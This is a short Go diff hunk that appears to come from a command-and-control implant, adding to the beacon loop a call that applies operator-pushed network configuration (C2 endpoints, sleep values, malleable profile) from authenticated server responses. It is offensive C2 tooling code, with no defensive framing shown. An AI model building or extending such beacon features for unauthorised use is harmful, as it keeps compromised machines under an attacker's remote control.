@@ -385,6 +385,12 @@ func doBeacon() {
 			inFastMode.Store(true)
 			return
 		}
+		// Online config refresh: an encrypted response may carry the operator's
+		// live network config (changed or periodic). It is secret-bound and the
+		// enclosing frame is AEAD-authenticated, so applying it is safe. This
+		// keeps a long-running beacon on the current C2 endpoints, sleep values
+		// and malleable profile without re-registering.
+		applyServerNetworkConfig(resp.NetworkConfig)
 		beaconConsecutiveFailures = 0
 		// Fast-forward if the server is ahead of us (guards against a desync
 		// where our persisted sequence drifted behind the server's last_seq).
